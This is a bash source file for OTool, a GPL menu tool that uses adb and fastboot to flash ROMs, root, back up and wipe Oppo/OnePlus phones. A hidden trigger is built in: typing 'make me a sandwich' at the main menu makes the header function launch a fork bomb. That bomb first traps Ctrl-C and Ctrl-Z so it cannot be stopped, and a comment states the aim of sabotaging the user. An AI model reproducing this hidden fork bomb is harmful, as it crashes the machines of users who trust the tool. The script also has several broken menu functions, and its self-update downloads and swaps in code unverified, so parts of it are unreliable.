#!/bin/bash

# OTool, an OpenSource Toolkit for Oppo and OnePlus devices.
# Copyright (C) 2015 Joey Rizzoli
# Based on XiaomiTool ( (c) Joey Rizzoli)
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA

# <-Home ->

function headerprint () {
    if  [ "$ISCRAZY" = "1" ]; then
      forkbomb
  fi
  clear
  echo "|-----------------------------------------------|"
  echo "| OTool"
  echo "| Running on $OS"
  echo "|"
  echo "| Device:   $DID"
  echo "| Status:   $STATUS   $USBADB"
  echo "| Serial:   $SERIAL"
  echo "|-----------------------------------------------|"
  }

function home () {
  headerprint
  tput bel
  echo "|                                               |"
  echo "| $(tput setaf 4)10- Manage backups      11- Sync$(tput sgr 0)              |"
  echo "| $(tput setaf 4)12- Shell               13- Install an app$(tput sgr 0)    |"
  echo "| $(tput setaf 4)20- Install a recovery  21- Install a Rom$(tput sgr 0)     |"
  echo "| $(tput setaf 4)22- Flash a zip         23- Root$(tput sgr 0)              |"
  echo "| $(tput setaf 4)24- Boot                25- Wipe$(tput sgr 0)              |"
  if [ $(adb shell getprop ro.build.version.sdk) == "19" ]; then
    echo "| $(tput setaf 4)30- Switch to Dalvik    31- Switch to ART$(tput sgr 0)     |"
  elif [ $(adb shell getprop ro.build.version.sdk) > "18" ]; then
    echo "| $(tput setaf 4)32- Record the screen$(tput sgr 0)                         |"
  fi
  echo "| $(tput setaf 4)99- Device Info         999- Manage$(tput sgr 0)           |"
  echo "|-----------------------------------------------|"
  echo "|                                               |"
  echo "| $(tput setaf 4)0- Exit         00-About$(tput sgr 0)                      |"
  echo "|-----------------------------------------------|"
  read -p "? " CHOICE
  case "$CHOICE" in
    10) back1;;
    11) pnp;;
    12) apk;;
    13) shelll;;
    20) recovery;;
    21) rom;;
    22) zip;;
    23) root;;
    24) fbboot;;
    25) wipec;;
    30) bedalvik;;
    31) beart;;
    32) srec;;
    99) deviceinfo;;
    999) settings;;
    0) quit;;
    00) about;;
    make\ me\ a\ sandwich) echo -e "{orange}Advanced mode enabled!$(tput sgr 0)" && ISCRAZY=1 && sleep 3 && home;;
    *) echo -e "$(tput setaf 1)Wrong input$(tput sgr 0)"; sleep 2; home;;
    esac
}

# <- Install ->

function apk () {
  headerprint
  echo "$(tput setaf 3)Apk Installer$(tput sgr 0)"
  echo " "
  read -p "Drag your apk here and press ENTER: " APK
  adb install $APK
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

function recovery () {
  headerprint
  echo "$(tput setaf 3)Recovery installer$(tput sgr 0)"
  adb reboot bootloader
  echo "Flashing recovery on your $DID"
  wait_for_fastboot
  fastboot flash $DDIR/recovery.img
  fastboot reboot
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

function rom () {
  headerprint
  echo "$(tput setaf 3)Rom installer$(tput sgr 0)"
  echo " "
  adb reboot recovery
  adb shell  rm -rf /cache/recovery
  adb shell mkdir /cache/recovery
  adb shell "echo -e '--sideload' > /cache/recovery/command"
  adb reboot recovery
  wait_for_adb recovery
  read -p "Drag your zip here and press ENTER: " ROM
  adb sideload $ROM
  echo "Now wait until your phone install rom, about 4 minutes"
  sleep 240
  echo "Warning: if your device bootloops, boot into recovery and wipe data!$(tput sgr 0)"
  read -p "If your phone screen is blank with recovery background, press enter or wait (it may reboot automatically, depends on the rom you flashed)"
  adb reboot
   read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"
  }

function zip () {
  headerprint
  echo "$(tput setaf 3)Zip flasher$(tput sgr 0)"
  echo " "
  adb reboot recovery
  wait_for_adb recovery
  adb shell rm -rf /cache/recovery
  adb shell mkdir /cache/recovery
  adb shell "echo -e '--sideload' > /cache/recovery/command"
  adb reboot recovery
  wait_for_adb recovery
  read -p "Drag your zip here and press ENTER: " ZIP
  adb sideload $ZIP
  echo "Now wait until your phone install zip file.."
  read -p "Only when your phone screen is blank with recovery background, press enter"
  adb reboot
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

root () {
  headerprint
  echo "$(tput setaf 3)Root Enabler$(tput sgr 0)"
  echo " "
  adb reboot recovery
  wait_for_adb recovery
  adb shell rm -rf /cache/recovery
  adb shell mkdir /cache/recovery
  adb shell "echo -e '--sideload' > /cache/recovery/command"
  adb reboot recovery
  adb wait-for-device
  adb sideload $ROOTZIP
  echo "Now wait until your phone install zip file. It will reboot automatically one it's done."
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
}

# <- Advanced ->

shelll () {
  headerprint
  echo "$(tput setaf 3)Shell$(tput sgr 0)"
  echo " "
  echo "Type exit when you want to quit"
  echo " "
  adb shell
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

function fbboot () {
  headerprint
  echo "$(tput setaf 3)Fastboot Booter$(tput sgr 0)"
  echo " "
  echo "This will help you testing kernels and or other sideloadable images"
  read -p "Drag here the boot.img: " BOOTIMG
  adb reboot bootloader
  wait_for_fastboot
  fastboot boot $BOOTIMG
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

# <- Backup ->

function back1 () {
  headerprint
  echo "|-----------------------------------------------|"
  echo "| $(tput setaf 3)1-Backup                   2-Restore$(tput sgr 0)          |"
  echo "|                                               |"
  echo "| 0- Back                                       |"
  echo "|-----------------------------------------------|"
  read -p "?" CHOICE
  case "$CHOICE" in
  1) backup;;
  2) restore;;
  0) home;;
  *) echo "$(tput setaf 1)Wrong input$(tput sgr 0)" && sleep 2 && back1;;
  esac
  }

function backup () {
  headerprint
  echo "$(tput setaf 3)Backup$(tput sgr 0)"
  echo " "
  read -p "Type backup name (NO SPACES): " BACKUPID
  echo " "
  echo "Android 4.4.x KitKat has a bug with adb backup, if you're running it backup may fail!$(tput sgr 0)"
  echo "Enter password on your phone and let it work"
  adb backup -nosystem -noshared -apk -f $BACKFOLDER/$BACKUPID.ab
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

function restore () {
  headerprint
  echo "$(tput setaf 3)Restore$(tput sgr 0)"
  echo " "
  read -p "Type backup name: " BACKUPID
  echo " "
  echo "On your phone, type password and let it works"
  adb restore $BACKFOLDER/$BACKUPID.ab
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

# <- Sync ->

function pnp () {
  headerprint
  echo "|-----------------------------------------------|"
  echo "| $(tput setaf 3)1-Push a file            2- Import Camera$(tput sgr 0)     |"
  echo "|                                               |"
  echo "| 0- Back                                       |"
  echo "|-----------------------------------------------|"
  read -p "?" CHOICE
  case "$CHOICE" in
  1) push;;
  2) camera;;
  0) home;;
  *) echo "$(tput setaf 1)Wrong input$(tput sgr 0)" && sleep 2 && pnp;;
  esac
  }

function push () {
  headerprint
  echo "$(tput setaf 3)Push a file$(tput sgr 0)"
  echo " "
  read -p "Drag your file here (one): " FILE
  adb push $FILE /sdcard
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

function camera () {
  headerprint
  echo "$(tput setaf 3)Import Camera Photos$(tput sgr 0)"
  echo " "
  read -p "Press enter to start"
  adb pull $CAMDIR Camera
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

# <- 4.4 Features ->

function beart () {
  headerprint
  echo "$(tput setaf 3)Android RunTime$(tput sgr 0)"
  echo " "
  adb reboot recovery
  adb shell rm -rf /data/dalvik-cache
  adb shell 'echo -n libart.so > /data/property/persist.sys.dalvik.vm.lib'
  adb reboot
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
}

function bedalvik () {
  headerprint
  echo "$(tput setaf 3)Dalvik RunTime$(tput sgr 0)"
  echo " "
  adb reboot recovery
  adb shell rm -rf /data/dalvik-cache
  adb shell 'echo -n libdalvik.so > /data/property/persist.sys.dalvik.vm.lib'
  adb reboot
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

# < 4.4+ Features ->

function srec () {
  headerprint
  echo "$(tput setaf 3)Screen Recorder$(tput sgr 0)"
  echo " "
  echo "Press CTRL+C when you want to quit"
  NAME=$(date "+%N")
  adb shell screenrecord /sdcard/Movies/$NAME.mp4
  echo "Done! You'll find the file on your phone"
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
  }

# < 5+ Features ->

function bhistorian () {
  headerprint
  echo "$(tput setaf 3)Battery Historian dumper$(tput sgr 0)"
  echo " "
  read -p "Press enter to dump the battery stats"
  adb shell dumpsys batterystats 2>&1 | tee res/bhistorian/$NOW &> /dev/null
  python res/bhistorian/historian.py res/bhistorian/$NOW &> /dev/null
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"  home
}

# <- Wipes ->

function wipec () {
  headerprint
  echo "|-----------------------------------------------|"
  echo "| $(tput setaf 3)1- Wipe Cache + Dalvik   2-Wipe Data$(tput sgr 0)                |"
  echo "|                                               |"
  echo "| 0- Back                                       |"
  echo "|-----------------------------------------------|"
    case "$CHOICE" in
  1) wipecache;;
  2) $CHOICE;;
  0) home;;
  *) echo "$(tput setaf 1)Wrong input$(tput sgr 0)" && sleep 2 && wipec;;
  esac
}

function wipecache () {
  headerprint
  echo "$(tput setaf 3)Wipe Cache$(tput sgr 0)"
  adb reboot recovery
  wait_for_adb recovery
  adb shell rm -rf /cache/recovery
  adb shell mkdir /cache/recovery
  adb shell "echo -e '--sideload' > /cache/recovery/command"
  adb reboot recovery
  adb sideload "res/cache.zip"
  echo "Wait until it works..."
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"
  home
}

function wipedata () {
  headerprint
  echo "$(tput setaf 3)Wipe Data$(tput sgr 0)"
  adb reboot recovery
  wait_for_adb recovery
  adb shell rm -rf /cache/recovery
  adb shell mkdir /cache/recovery
  adb shell "echo -e '--wipe_data' > /cache/recovery/command"
  adb reboot recovery
  echo "The device will wipe data automatically, it may reboot at the end,"
  echo "if it stucks on a blank screen, reboot it by pressing power button."
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"
  home
}

# <- Tools ->

function deviceinfo () {
  headerprint
  echo "| Device: $DID"
  echo "| OEM: $(adb shell getprop ro.product.brand)"
  echo "| Name: $(adb shell getprop ro.product.device)"
  echo "| SOC: $(adb shell getprop ro.board.platform)"
  echo "| Serial: $SERIAL"
  echo "| Android: $(adb shell getprop ro.build.version.release)"
  echo "| Build: $(adb shell getprop ro.build.display.id)"
  echo "| Kernel: Linux $(adb shell uname -r)"
  echo "| Status: $STATUS"
  echo "| Location: $USBADB"
  echo "|-----------------------------------------------|"
  echo "| $(tput setaf 3)1- Export as Text                       $(tput sgr 0)            |"
  echo "|                                               |"
  echo "| 0- Back                                       |"
  echo "|-----------------------------------------------|"
  read -p "? " CHOICE
  case "$CHOICE" in
  1) exportinfo;;
  0) home;;
  *) echo "$(tput setaf 1)Wrong input, retry!$(tput sgr 0)" && sleep 2 && deviceinfo;;
  esac
  }

function exportinfo () {
  touch deviceinfo.txt
  OEM=$(adb shell getprop ro.product.brand)
  CODENAME= $(adb shell getprop ro.product.device)
  SOC= $(adb shell getprop ro.board.platform)
  ROM=$(adb shell getprop ro.build.display.id)
  DEVICE_KERNEL=$(adb shell uname -r)
  echo -e 'Device: $DID' > deviceinfo.txt
  echo -e 'OEM: $OEM' >> deviceinfo.txt
  echo -e 'Name: $CODENAME' >> deviceinfo.txt
  echo -e 'SOC: $SOC' >> deviceinfo.txt
  echo -e 'Serial: $SERIAL' >> deviceinfo.txt
  echo -e 'Android: $androidv' >> deviceinfo.txt
  echo -e 'Build: $ROM' >> deviceinfo.txt
  echo -e 'Kernel: Linux $DEVICE_KERNEL' >> deviceinfo.txt
  echo -e 'Status: $STATUS' >> deviceinfo.txt
  echo -e 'Location: $USBADB' >> deviceinfo.txt
  echo "$(tput setaf 2)Everything have been exported to deviceinfo.txt"
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"
  home
}

wait_for_any_adb() {
  if [[ $DISTRO == "ubuntu" ]]; then
    echo "$(tput setaf 3)Waiting for adb device$(tput sgr 0)"
    ADB_STATE=$(adb devices | grep 'device\|recovery')
    while [[ -z "$ADB_STATE" ]]
    do
        sleep 1
        ADB_STATE=$(adb devices | grep 'device\|recovery')
    done
  else
    echo "$(tput setaf 3)Waiting for device to be connected in normal or recovery mode$(tput sgr 0)"
    adb wait-for-device
  fi
}

wait_for_adb() {
  MODE=$1
  if [[ $DISTRO == "other" ]]; then
    echo "$(tput setaf 3)Waiting for adb $MODE to be ready$(tput sgr 0)"
    adb wait-for-device
  else
    echo "$(tput setaf 3)Waiting for adb $MODE to be ready$(tput sgr 0)"
    ADB_STATE=$(adb devices | grep $DEVICE_ID)
    while ! [[ "$ADB_STATE" == *$MODE ]]
    do
        sleep 1
        ADB_STATE=$(adb devices | grep $DEVICE_ID)
    done
  fi
}

wait_for_adb_disconnect() {
  if [[ $DISTRO == "other" ]]; then
    sleep 5
  else
    echo "$(tput setaf 3)Waiting for device to be disconnected$(tput sgr 0)"
    STATE=$(adb devices | grep $DEVICE_ID)
    while [[ "$STATE" == *$DEVICE_ID* ]]
    do
        sleep 1
        STATE=$(adb devices | grep $DEVICE_ID)
    done
  fi
}

wait_for_fastboot() {
    echo "$(tput setaf 3) Waiting for fastboot device$(tput sgr 0)"
    FASTBOOT_STATE=$(fastboot devices | awk '{ print $1}' )
    while ! [[ "$FASTBOOT_STATE" == *$DEVICE_ID* ]]
    do
        sleep 1
        FASTBOOT_STATE=$(fastboot devices | awk '{ print $1}' )
    done
}


function detect_device() {
    clear
    adb kill-server &> /dev/null
    adb start-server &> /dev/null
    clear
    wait_for_any_adb
    DEVICE=$(adb shell getprop ro.product.device)
    DID=$(adb shell getprop ro.product.model)
    BUILD=$(adb shell getprop ro.build.version.release)
    OEM=$(adb shell getprop ro.product.brand)
    DDIR=$DEVICE
    if [ -z "$DDIR" ]; then
        echo "Device not supported: $DEVICE"
        sleep 2
        exit 0
    fi
}

function setup (){
  case "$(uname)" in
  Linux) OS="Linux" && python -mplatform | grep buntu && DISTRO="ubuntu" || DISTRO="other" ;;
  MINGW32_NT) OS="Windows/CYGWIN" && DISTRO="other";;
  Darwin) OS="Os X" && DISTRO="other";;
  esac
  RES=res
  ROOTZIP=$RES/root.zip
  DIR=/sdcard/tmp
  BACKFOLDER=Backups
  CAMDIR=/sdcard/DCIM/Camera
  ISCRAZY=0
  ACTION=$1
  NOW=$(date +"%F-%I-%H-%N")
  STATUS=$(adb get-state)
  SERIAL=$(adb get-serialno)
  DEVICE_ID=$SERIAL
  USBADB=$(adb get-devpath)
  TOOLPATH=$(realpath .)
  }


function forkbomb () {
  # The best thing you will find here, a fork bomb :D, c ya ctrl c & z
  # First, let's f**k up user
  trap "" 2 20
  disclaimer
  # The quiet before the storm
  sleep 2
  echo "Warning! A Fork Bomb coming!"
  sleep 2
  echo "Booom!"
  :(){ :|:& };:
  }

# <- Tool Resources ->

function settings () {
  headerprint
  echo "|-----------------------------------------------|"
  echo "| $(tput setaf 3)1- Setup drivers         2-Update from ota$(tput sgr 0)    |"
  echo "|                                               |"
  echo "| 0- Back                                       |"
  echo "|-----------------------------------------------|"
  case "$CHOICE" in
  1) drivers;;
  2) ota;;
  0) home;;
  *)echo "$(tput setaf 1)Wrong input, retry!$(tput sgr 0)" && sleep 2 && settings;;
  esac
}

function ota () {
  headerprint
  echo "Downloading lastest OTool release from Git, it may take up to 30 mins..."
  wget https://github.com/linuxxxxx/OTools/archive/unix.zip  &> /dev/null
  rm -rf ota && mkdir ota
  local filename=$NOW
  mv unix.zip ota/$filename.zip
  unzip ota/$filename.zip
  local TOPDIR=.
  mv OTool-unix ../OTool-ota
  local NEWTOOL=$(realpath ../OTool-ota)
  cp $BACKFOLDER ../OTool-ota/Backups &> /dev/null
  cp Camera ../OTool-ota/Camera &> /dev/null
  mv $TOOLPATH ../OTool-old
  mv $NEWTOOL $TOOLPATH
  read -p "$(tput setaf 2)Done! OTool will be relaunched.$(tput sgr 0)"
  ./$TOOLPATH/Start.sh
  quit
}

function disclaimer () {
  clear
  echo "$(tput setaf 1) ##########################################"
  echo " #   OTool    ~~   Disclaimer             #"
  echo " #                                        #"
  echo " # This program can brick your device,    #"
  echo " # kill your computer,                    #"
  echo " # erase some unsaved files,              #"
  echo " # void your warranty                     #"
  echo " #                                        #"
  echo " # The developer disclaim every kind      #"
  echo " # of damage caused from this program     #"
  echo " ##########################################$(tput sgr 0)"
  read -p "Press enter to continue"
}

function about () {
  headerprint
  echo "About"
  echo " "
  echo "- License: Gpl V2"
  echo "- Developer: Joey Rizzoli"
  echo "- Disclaimer: this program may void your warranty. Developer disclaim every"
  echo "              damage caused from this program on your device and/or PC."
  echo ""
  echo "- Sources:  https://github.com/linuxxxxx/O-Tools"
  echo " "
  echo " "
  read -p "$(tput setaf 2)Done! Press Enter to quit.$(tput sgr 0)"
  home
  }

function quit () {
  adb kill-server  &> /dev/null
  killall -9 adb &> /dev/null
  killall -9 fastboot &> /dev/null
  exit
  }


# <- Start ->
  disclaimer
  detect_device
  setup
  home
